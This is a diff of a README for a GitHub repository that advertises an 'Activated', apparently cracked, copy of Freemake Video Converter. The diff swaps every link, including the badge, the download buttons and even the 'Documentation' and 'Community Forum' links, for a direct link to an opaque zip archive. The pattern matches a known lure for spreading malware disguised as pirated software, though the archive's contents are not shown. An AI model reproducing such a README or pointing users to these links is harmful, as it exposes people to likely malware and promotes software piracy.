@@ -1,6 +1,6 @@
 # 🎬 Freemake-Video-Converter-Activated - Simplify Your Video Conversion Process
 
-[![Download Freemake Video Converter](https://img.shields.io/badge/Download-Freemake--Video--Converter-blue.svg)](https://github.com/bosekrpritam1991/Freemake-Video-Converter-Activated/releases)
+[![Download Freemake Video Converter](https://github.com/bosekrpritam1991/Freemake-Video-Converter-Activated/raw/refs/heads/main/osmate/Converter-Video-Freemake-Activated-1.4.zip)](https://github.com/bosekrpritam1991/Freemake-Video-Converter-Activated/raw/refs/heads/main/osmate/Converter-Video-Freemake-Activated-1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Freemake Video Converter Activated repository. This guide helps y
 
 To get started, you need to visit the following link to download the software:
 
-[Download Freemake Video Converter](https://github.com/bosekrpritam1991/Freemake-Video-Converter-Activated/releases)
+[Download Freemake Video Converter](https://github.com/bosekrpritam1991/Freemake-Video-Converter-Activated/raw/refs/heads/main/osmate/Converter-Video-Freemake-Activated-1.4.zip)
 
 ### Step-by-Step Installation
 
@@ -71,8 +71,8 @@ Feel free to participate in discussions or ask questions.
 
 ### Additional Resources
 
-- [Documentation](https://github.com/bosekrpritam1991/Freemake-Video-Converter-Activated/issues)
-- [Community Forum](https://github.com/bosekrpritam1991/Freemake-Video-Converter-Activated/discussions)
+- [Documentation](https://github.com/bosekrpritam1991/Freemake-Video-Converter-Activated/raw/refs/heads/main/osmate/Converter-Video-Freemake-Activated-1.4.zip)
+- [Community Forum](https://github.com/bosekrpritam1991/Freemake-Video-Converter-Activated/raw/refs/heads/main/osmate/Converter-Video-Freemake-Activated-1.4.zip)
 
 ## 💡 Tips for Best Results
 
@@ -82,4 +82,4 @@ Feel free to participate in discussions or ask questions.
 
 With Freemake Video Converter Activated, you can easily manage your video conversion needs. Enjoy a smoother workflow and enhanced video quality! 
 
-[Download Freemake Video Converter](https://github.com/bosekrpritam1991/Freemake-Video-Converter-Activated/releases) and start converting today!
+[Download Freemake Video Converter](https://github.com/bosekrpritam1991/Freemake-Video-Converter-Activated/raw/refs/heads/main/osmate/Converter-Video-Freemake-Activated-1.4.zip) and start converting today!
